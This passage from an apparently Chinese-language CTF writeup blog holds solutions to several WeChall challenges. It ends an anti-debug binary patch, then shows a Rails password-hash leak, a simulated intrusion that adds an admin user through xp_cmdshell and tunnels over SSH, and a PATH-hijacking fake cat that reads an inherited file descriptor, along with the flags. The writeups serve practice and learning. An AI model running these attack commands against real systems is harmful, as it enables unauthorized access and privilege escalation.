Layer 4b: bypass 0xCC check — jne→jmp @ VA 0x08048d87 (1 byte)</span></span><br><span class="line">        f.seek(<span class="number">0x0d87</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\xeb&#x27;</span>)  <span class="comment"># 0x75(jne) → 0xeb(jmp)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 5: call ptrace → xor eax,eax @ VA 0x08048dc0 (5 bytes)</span></span><br><span class="line">        f.seek(<span class="number">0x0dc0</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x31\xc0\x90\x90\x90&#x27;</span>)  <span class="comment"># xor eax,eax; nop; nop; nop</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Patched: <span class="subst">&#123;filepath&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    patch(sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;bsd_thelasthope.elf&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>Patch 后运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3 patch.py bsd_thelasthope.elf</span><br><span class="line">$ chmod +x bsd_thelasthope.elf</span><br><span class="line">$ ./bsd_thelasthope.elf</span><br><span class="line">User: whoami</span><br><span class="line">Password: PrimeTwins</span><br><span class="line">Correct !! The solution is username_password</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">whoami_PrimeTwins</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-railsbin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-railsbin/" class="post-title-link" itemprop="url">WeChall - Railsbin</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-14 14:22:27" itemprop="dateCreated datePublished" datetime="2026-07-14T14:22:27+08:00">2026-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-railsbin/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-railsbin/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Railsbin (Exploit) — score 3, by gizmore.</p>
+<p>The project named "railsbin" is open source, but has a few security
+problems. Can you exploit the demo site? The solution is the password
+hash of user solution.</p>
+</blockquote>
+<p>Railsbin 是一个开源 Ruby on Rails pastebin demo。源码在 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpem1vcmUvcmFpbHNiaW4=">gizmore/railsbin<i class="fa fa-external-link-alt"></i></span>。目标是得到用户
+<code>solution</code> 的 bcrypt password hash。</p>
+<h3 id="solution">Solution</h3>
+<p>源码审计发现 <code>UsersController#index</code> 有一个漏洞：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app/controllers/users_controller.rb:8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span></span><br><span class="line">  <span class="variable">@users</span> = <span class="title class_">User</span>.all</span><br><span class="line">  <span class="variable">@users</span>.map &#123;|<span class="params">u</span>| u.password = u.encrypted_password &#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>将 <code>encrypted_password</code>（bcrypt hash）复制到虚拟属性
+<code>password</code> 上。JSON view 直接序列化暴露：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app/views/users/index.json.jbuilder</span></span><br><span class="line">json.extract! user, <span class="symbol">:id</span>, <span class="symbol">:name</span>, <span class="symbol">:email</span>, <span class="symbol">:password</span></span><br></pre></td></tr></table></figure>
+<p><strong>无需认证</strong>，直接请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https://railsbin.wechall.net/users.json</span><br></pre></td></tr></table></figure>
+<p>返回所有用户的完整 bcrypt hash，包括 <code>solution</code> 用户：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">17</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;solution&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;solution@wechall.net&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$2a$10$44GwiA6ai0wxjzhFkeyjuO3kdVvmco8ReypH7H1tLsM2OrRFhe4CK&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">$2a$10$44GwiA6ai0wxjzhFkeyjuO3kdVvmco8ReypH7H1tLsM2OrRFhe4CK</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-z-reloaded/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-z-reloaded/" class="post-title-link" itemprop="url">WeChall - Z - Reloaded</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-14 14:07:35" itemprop="dateCreated datePublished" datetime="2026-07-14T14:07:35+08:00">2026-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 10:08:43" itemprop="dateModified" datetime="2026-09-15T10:08:43+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-z-reloaded/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-z-reloaded/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Z - Reloaded (Exploit, Simulated, Storyline) — score 6</p>
+<p>Before starting the challenge I suggest you to save every information
+and solution, because later in the challenge it is likely that you will
+need them again. Especially if you see passwords in the narrator
+box.</p>
+</blockquote>
+<p>Z 系列故事线的一部分。扮演
+Trinity（黑客帝国），通过模拟终端执行一系列渗透任务，最终瘫痪城市电网。</p>
+<h3 id="关卡攻略">关卡攻略</h3>
+<p>游戏引擎在 <code>zshellz.php</code>，答案存储在
+<code>zshellz_answers.php</code>（gitignored）。源码和语言文件可从
+<code>gizmore/gwf3</code> GitHub 仓库获取。</p>
+<h4 id="level-1nmap-扫描">Level 1：nmap 扫描</h4>
+<p>任务：对 10.2.2.2 执行 stealth SYN 扫描。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sS 10.2.2.2</span><br></pre></td></tr></table></figure>
+<p>输出显示目标运行 OpenSSH 2.2.0。</p>
+<h4 id="level-2漏洞源文件">Level 2：漏洞源文件</h4>
+<p>任务：找出脆弱服务，命名包含安全漏洞的源文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deattack.c</span><br></pre></td></tr></table></figure>
+<p>对应 SSH CRC32 漏洞（CVE-2001-0144），<code>detect_attack()</code>
+函数在 <code>deattack.c</code> 中。</p>
+<h4 id="level-3sshnuke-利用">Level 3：sshnuke 利用</h4>
+<p>任务：使用电影中的著名命令攻击脆弱服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshnuke 10.2.2.2 -rootpw=&quot;Z1ON0101&quot;</span><br></pre></td></tr></table></figure>
+<p>命令格式源自 Matrix Reloaded 电影画面</p>
+<h4 id="level-4ssh-端口转发">Level 4：SSH 端口转发</h4>
+<p>任务：建立 SSH 隧道将本地 MSSQL 端口转发到内网数据库服务器
+192.168.10.2。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 1433:192.168.10.2:1433 10.2.2.2</span><br></pre></td></tr></table></figure>
+<p>SSH 密码：<code>Z1ON0101</code>（sshnuke 重置后的 root 密码）</p>
+<h4 id="level-5输入密码">Level 5：输入密码</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Z1ON0101</span><br></pre></td></tr></table></figure>
+<h4 id="level-6osql-登录-mssql">Level 6：osql 登录 MSSQL</h4>
+<p>任务：使用 osql 客户端登录 MSSQL 2000 服务器。利用 MSSQL 2000
+著名漏洞：默认空 SA 密码。</p>
+<p><code>-P</code> 参数无值即 NULL 密码，这是 MSSQL 2000
+默认安装的著名弱点。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osql -U sa -P</span><br></pre></td></tr></table></figure>
+<h4 id="level-7添加-windows-用户">Level 7：添加 Windows 用户</h4>
+<p>任务：添加 Windows 用户 trinity，密码 Z1ON0101。</p>
+<p>利用 <code>xp_cmdshell</code> 扩展存储过程执行系统命令（MSSQL 2000
+默认启用）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;net user trinity Z1ON0101 /add&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="level-8添加用户到管理员组">Level 8：添加用户到管理员组</h4>
+<p>任务：将 trinity 加入 administrators 组。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;net localgroup administrators trinity /add&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="level-9rdp-端口转发">Level 9：RDP 端口转发</h4>
+<p>任务：建立新的端口转发，将本地 RDP 端口通过网关转发到数据库服务器的
+RDP 端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 3389:192.168.10.2:3389 10.2.2.2</span><br></pre></td></tr></table></figure>
+<h4 id="level-10反向端口转发">Level 10：反向端口转发</h4>
+<p>任务：将网关 10.2.2.2 端口 222 转发到本机 164.109.44.69 端口 22。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 222:164.109.44.69:22 10.2.2.2</span><br></pre></td></tr></table></figure>
+<h4 id="level-11scp-传输文件">Level 11：SCP 传输文件</h4>
+<p>任务：从数据库服务器复制病毒文件到本机。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 222 trinity@10.2.2.2:/home/trinity/nasty_virus .</span><br></pre></td></tr></table></figure>
+<h4 id="level-12">Level 12</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MyL0v315N30</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-warchall-tryouts/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-warchall-tryouts/" class="post-title-link" itemprop="url">WeChall - Warchall Tryouts</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-14 10:32:00" itemprop="dateCreated datePublished" datetime="2026-07-14T10:32:00+08:00">2026-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 09:54:47" itemprop="dateModified" datetime="2026-09-15T09:54:47+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-warchall-tryouts/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-warchall-tryouts/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Warchall: Tryouts (Warchall) — score 6.</p>
+<p>This challenge is the first of the warchall series. You might want to
+play the other warchall challenges too.</p>
+<p>Level: easy</p>
+</blockquote>
+<p><strong>前置条件：</strong> 需要 WeChall → Warchall
+账号关联，并可通过 SSH 登录 Warchall 服务器。</p>
+<h3 id="源码分析">源码分析</h3>
+<p>SSH 登录 Warchall 后，在 home 目录找到 <code>tryouts</code>
+二进制和源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">userinfo</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> passFd = <span class="number">0</span>, randFd = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">17</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> input = <span class="number">0</span>, rand = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> correct = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read the password file */</span></span><br><span class="line">    passFd = open(<span class="string">&quot;solution.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (passFd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read random bytes for comparison */</span></span><br><span class="line">    randFd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (randFd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read one byte from urandom to compare */</span></span><br><span class="line">    read(randFd, &amp;rand, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read 17 bytes from solution.txt */</span></span><br><span class="line">    read(passFd, password, <span class="number">16</span>);</span><br><span class="line">    password[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ve got a random number for you: %d\n&quot;</span>, rand);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fork and exec cat for comparison */</span></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* child: replaces comparison with cat */</span></span><br><span class="line">        system(<span class="string">&quot;cat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="solution">solution</h3>
+<ol type="1">
+<li>程序打开 <code>solution.txt</code> 获取文件描述符
+<code>passFd</code>（通常是 fd 3）</li>
+<li>读取 password 后用 <code>fork()</code> 创建子进程</li>
+<li>子进程执行 <code>system("cat")</code></li>
+<li><code>fork(2)</code> 文档：子进程继承父进程的打开文件描述符</li>
+<li>文件描述符共享当前文件偏移量：<code>solution.txt</code> 已被读到
+EOF</li>
+</ol>
+<p><strong>关键：</strong> 子进程中的 <code>cat</code> 可以通过
+<code>/proc/self/fd/3</code> 访问
+<code>solution.txt</code>，但直接读会得到
+EOF（文件偏移已在末尾）。需要<strong>重置偏移量</strong>。</p>
+<p>创建自己的 <code>cat</code> 命令，替换 PATH 中的系统
+<code>cat</code>，使其从 fd 3 读取并先 <code>lseek</code> 重置偏移：</p>
+<p><strong>方案一：Perl</strong></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">open</span> F, <span class="string">&#x27;&lt;&amp;3&#x27;</span>;</span><br><span class="line"><span class="keyword">seek</span> F, <span class="number">0</span>, <span class="number">0</span>;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">read</span> F, <span class="variable">$a</span>, <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">while</span> (&lt;&gt;) &#123; <span class="keyword">print</span> &#125;</span><br></pre></td></tr></table></figure>
+<p><strong>方案二：Python</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f = os.fdopen(<span class="number">3</span>)</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(f.read(<span class="number">17</span>))</span><br></pre></td></tr></table></figure>
+<p><strong>方案三：C</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    lseek(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> n = read(<span class="number">3</span>, buf, <span class="number">255</span>);</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">        write(<span class="number">1</span>, buf, n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>执行步骤：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译自定义 cat</span></span><br><span class="line"><span class="built_in">cat</span> &gt; ~/bin/cat.c &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    char buf[256] = &#123;0&#125;;</span><br><span class="line">    lseek(3, 0, 0);</span><br><span class="line">    int n = <span class="built_in">read</span>(3, buf, 255);</span><br><span class="line">    <span class="keyword">if</span> (n &gt; 0) write(1, buf, n);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">gcc -o ~/bin/cat ~/bin/cat.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保 PATH 优先使用我们的 cat</span></span><br><span class="line"><span class="built_in">export</span> PATH=~/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行 tryouts，它会 fork 并执行我们的 cat</span></span><br><span class="line">./tryouts</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">EveryDayShuffle4</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-burning-fox/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-burning-fox/" class="post-title-link" itemprop="url">WeChall - Burning Fox</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
